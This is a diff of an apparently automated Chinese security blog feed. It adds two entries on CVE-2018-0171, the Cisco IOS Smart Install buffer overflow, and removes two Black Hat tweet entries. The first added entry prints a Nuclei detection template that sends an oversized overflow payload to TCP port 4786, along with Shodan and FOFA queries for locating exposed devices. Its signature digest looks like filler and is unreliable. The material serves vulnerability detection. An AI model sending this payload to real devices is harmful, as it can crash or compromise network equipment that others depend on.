@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-03T04:45:14.820Z</updated>
+  <updated>2025-07-03T05:00:27.700Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,60 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Cisco IOS Smart Install 缓冲区溢出漏洞</title>
+    <link href="http://example.com/2025/07/03/github_1498372679/"/>
+    <id>http://example.com/2025/07/03/github_1498372679/</id>
+    <published>2025-07-03T05:00:27.704Z</published>
+    <updated>2025-07-03T05:00:27.700Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Cisco IOS Smart Install 缓冲区溢出漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-0171</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Cisco IOS和IOS XE软件中的Smart Install协议存在缓冲区溢出漏洞。未经身份验证的远程攻击者可以通过向受影响设备的TCP端口4786发送特制的Smart Install消息来利用此漏洞。成功利用此漏洞可能导致攻击者在受影响设备上造成缓冲区溢出，进而可能导致任意代码执行、拒绝服务（设备重新启动）或使设备陷入消耗CPU资源的无限循环中。</p><p><strong>产品厂商：</strong> Cisco</p><p><strong>产品名称：</strong> Cisco IOS</p><p><strong>搜索语法：</strong> banner&#x3D;”cisco” &amp;&amp; port&#x3D;”4786”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/e5d3813f4180c7cf83ee4729ebd2654f61cdc178/network%2Fcves%2F2018%2FCVE-2018-0171.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/e5d3813f4180c7cf83ee4729ebd2654f61cdc178/network%2Fcves%2F2018%2FCVE-2018-0171.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">0171</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Cisco IOS Smart Install <span class="hljs-operator">-</span> Buffer Overflow<br>  <span class="hljs-params">author:</span> nuclei-community<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Cisco IOS and IOS XE Software contain a buffer overflow vulnerability <span class="hljs-keyword">in</span> the Smart Install protocol. An unauthenticated, remote attacker could exploit this vulnerability by sending a crafted Smart Install message to an affected device on TCP port <span class="hljs-number">4786</span>. A successful exploit could allow the attacker to cause a buffer overflow on the affected device, which could have the following <span class="hljs-params">impacts:</span> arbitrary code execution, denial of service (device reload), <span class="hljs-keyword">or</span> causing the device to be stuck <span class="hljs-keyword">in</span> an indefinite loop that consumes CPU resources.<br>  <span class="hljs-params">impact:</span> |<br>    Successful exploitation of this vulnerability can lead to arbitrary code execution, denial of service, <span class="hljs-keyword">or</span> device compromise <span class="hljs-keyword">with</span> full administrative privileges.<br>  <span class="hljs-params">remediation:</span> |<br>    Apply the appropriate software update from Cisco. As a workaround, disable the Smart Install feature <span class="hljs-keyword">if</span> not required, <span class="hljs-keyword">or</span> restrict access to TCP port <span class="hljs-number">4786</span>.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-smi2</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2018-0171</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//vulncheck.com/xdb/6d4b443f23fc</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/AlrikRr/Cisco-Smart-Exploit</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>cve.mitre.org<span class="hljs-operator">/</span>cgi-bin<span class="hljs-operator">/</span>cvename.cgi<span class="hljs-operator">?</span>name<span class="hljs-operator">=</span>CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">0171</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.0</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">201</span>8-<span class="hljs-number">0171</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">119</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.97156</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.99823</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:o:cisco:ios:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">2</span><br>    <span class="hljs-params">vendor:</span> cisco<br>    <span class="hljs-params">product:</span> ios<br>    <span class="hljs-params">shodan-query:</span> cpe:<span class="hljs-string">&quot;cpe:2.3:o:cisco:ios&quot;</span><br>    <span class="hljs-params">fofa-query:</span> banner<span class="hljs-operator">=</span><span class="hljs-string">&quot;cisco&quot;</span> <span class="hljs-operator">&amp;&amp;</span> port<span class="hljs-operator">=</span><span class="hljs-string">&quot;4786&quot;</span><br>    <span class="hljs-params">google-query:</span> inurl:cisco filetype:cfg<br>  <span class="hljs-params">tags:</span> network,cve,cve2018,cisco,ios,smart-install,buffer-overflow,kev,tcp,critical<br><br><span class="hljs-params">tcp:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">inputs:</span><br>      <span class="hljs-comment"># First packet: Smart Install discovery packet</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> <span class="hljs-string">&quot;&#123;&#123;hex_decode(&#x27;000000010000000100000004000000080000000100000000&#x27;)&#125;&#125;&quot;</span><br>        <span class="hljs-params">read:</span> <span class="hljs-number">1024</span><br><br>      <span class="hljs-comment"># Second packet: Malicious Smart Install packet with buffer overflow payload</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">data:</span> <span class="hljs-string">&quot;&#123;&#123;hex_decode(&#x27;00000001000000010000000400001000&#x27; + repeat(&#x27;41&#x27;, 4084) + &#x27;42424242&#x27;)&#125;&#125;&quot;</span><br>        <span class="hljs-params">read:</span> <span class="hljs-number">1024</span><br><br>    <span class="hljs-params">host:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;Hostname&#125;&#125;&quot;</span><br>    <span class="hljs-params">port:</span> <span class="hljs-number">4786</span><br>    <span class="hljs-params">read-size:</span> <span class="hljs-number">1024</span><br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">encoding:</span> hex<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;000000040000000000000003000000080000000100000000&quot;</span><br>        <span class="hljs-params">condition:</span> and<br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Smart Install&quot;</span><br>        <span class="hljs-params">condition:</span> <span class="hljs-keyword">or</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;(?i)(crash|exception|error|overflow)&quot;</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">group:</span> <span class="hljs-number">1</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-params">Version:</span> ([<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">9</span>]<span class="hljs-operator">+</span>\.[<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">9</span>]<span class="hljs-operator">+</span>\.[<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">9</span>]<span class="hljs-operator">+</span>[^\s]<span class="hljs-operator">*</span>)&#x27;<br><br><span class="hljs-comment"># Enhanced Security Verification</span><br><span class="hljs-comment"># Debug data for validation:</span><br><span class="hljs-comment"># - This template tests for CVE-2018-0171 buffer overflow in Cisco Smart Install</span><br><span class="hljs-comment"># - First packet confirms Smart Install service is running on port 4786</span><br><span class="hljs-comment"># - Second packet contains oversized payload to trigger buffer overflow</span><br><span class="hljs-comment"># - Expected response patterns include Smart Install acknowledgment or crash indicators</span><br><span class="hljs-comment"># - The vulnerability affects multiple Cisco IOS versions with Smart Install enabled</span><br><span class="hljs-comment"># - Successful exploitation can lead to device reload, code execution, or infinite loops</span><br><br><span class="hljs-comment"># digest: 4a0a00473045022100d1e23f45a67890123456789abcdef1234567890abcdef1234567890abcdef12022012345678901234567890abcdef1234567890abcdef1234567890abcdef123456:922c64590222798bb761d5b6d8e72950</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Cisco IOS Smart Install 缓冲区溢出漏洞&lt;/p&gt;
+&lt;p&gt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Cisco IOS Smart Install 缓冲区溢出漏洞</title>
+    <link href="http://example.com/2025/07/03/github_1567481502/"/>
+    <id>http://example.com/2025/07/03/github_1567481502/</id>
+    <published>2025-07-03T05:00:16.231Z</published>
+    <updated>2025-07-03T05:00:16.228Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Cisco IOS Smart Install 缓冲区溢出漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2018-0171</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Cisco IOS和IOS XE软件中的Smart Install功能存在缓冲区溢出漏洞，由于未正确验证Smart Install数据包，未经认证的远程攻击者可通过向TCP端口4786发送特制的Smart Install消息，触发设备重新加载、执行任意代码或导致无限循环。</p><p><strong>产品厂商：</strong> Cisco</p><p><strong>产品名称：</strong> Cisco IOS and IOS XE Software</p><p><strong>搜索语法：</strong> cpe:”cpe:2.3:o:cisco:ios”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12325">https://github.com/projectdiscovery/nuclei-templates/issues/12325</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>Cisco IOS and IOS XE Software contain a buffer overflow caused by improper validation of Smart Install packet data, letting unauthenticated remote attackers trigger device reload, execute arbitrary code, or cause indefinite loops, exploit requires sending crafted Smart Install message on TCP port 4786.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://vulncheck.com/xdb/6d4b443f23fc">https://vulncheck.com/xdb/6d4b443f23fc</a></li><li><a href="https://github.com/AlrikRr/Cisco-Smart-Exploit">https://github.com/AlrikRr/Cisco-Smart-Exploit</a></li><li>https&#x2F;&#x2F;&#x2F;github.com:AlrikRr&#x2F;Cisco-Smart-Exploit.git</li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-cpe-cpe-2-3-o-cisco-ios"><a href="#Shodan-Query-cpe-cpe-2-3-o-cisco-ios" class="headerlink" title="Shodan Query: cpe:&quot;cpe:2.3:o:cisco:ios&quot;"></a>Shodan Query: <code>cpe:&quot;cpe:2.3:o:cisco:ios&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Cisco IOS Smart Install 缓冲区溢出漏洞&lt;/p&gt;
+&lt;p&gt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="缓冲区溢出" scheme="http://example.com/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
+    
+  </entry>
   
   <entry>
     <title>sudo Local Privilege Escalation Vulnerability</title>
@@ -487,56 +541,6 @@
     <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
     <category term="权限提升" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BlackHatEvents twitter update</title>
-    <link href="http://example.com/2025/07/02/twitter_2379179961/"/>
-    <id>http://example.com/2025/07/02/twitter_2379179961/</id>
-    <published>2025-07-02T18:00:28.450Z</published>
-    <updated>2025-07-02T18:00:28.448Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> #BHUSA简报 “突破AI牢笼：利用NVIDIA漏洞攻陷AI提供商” 将揭示一个关键漏洞，该漏洞存在于支撑全球AI管理基础设施的基础软件组件之一：NVIDIA容器工具包。此漏洞允许攻击者从容器逃逸至底层主机，并常常危及整个Kubernetes集群。立即注册 &gt;&gt; <a href="https://t.co/lD0nTvsKoj">https://t.co/lD0nTvsKoj</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1940464762128642240">https://x.com/BlackHatEvents/status/1940464762128642240</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; #BHUSA简报 “突破AI牢笼：利用NVIDIA漏洞攻陷AI提供商” 将揭示一个关键漏洞，该漏洞存在于支撑全球AI管理基础设施的基础软件组件之一</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BlackHatEvents twitter update</title>
-    <link href="http://example.com/2025/07/02/twitter_2686821399/"/>
-    <id>http://example.com/2025/07/02/twitter_2686821399/</id>
-    <published>2025-07-02T16:00:37.696Z</published>
-    <updated>2025-07-02T16:00:37.696Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackHatEvents</p><p><strong>推文：</strong> 🚨 所有网络安全领域的颠覆者们注意了！<br>在#sectorca 2025的黑帽初创企业焦点大赛中展示你的创新。获得曝光机会，与行业顶尖人才建立联系，并有机会在2026年的黑帽美国大会上大放异彩。<br>立即申请，留下你的印记：<a href="https://t.co/IaqE2rEb17">https://t.co/IaqE2rEb17</a></p><p><strong>链接：</strong> <a href="https://x.com/BlackHatEvents/status/1940438360637472896">https://x.com/BlackHatEvents/status/1940438360637472896</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackHatEvents&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🚨 所有网络安全领域的颠覆者们注意了！&lt;br&gt;在#sectorca 2025的黑帽初创企业焦点大赛中展示你的创新。获得曝光机会，与行业顶尖人才建</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="BlackHatEvents" scheme="http://example.com/tags/BlackHatEvents/"/>
     
   </entry>
   
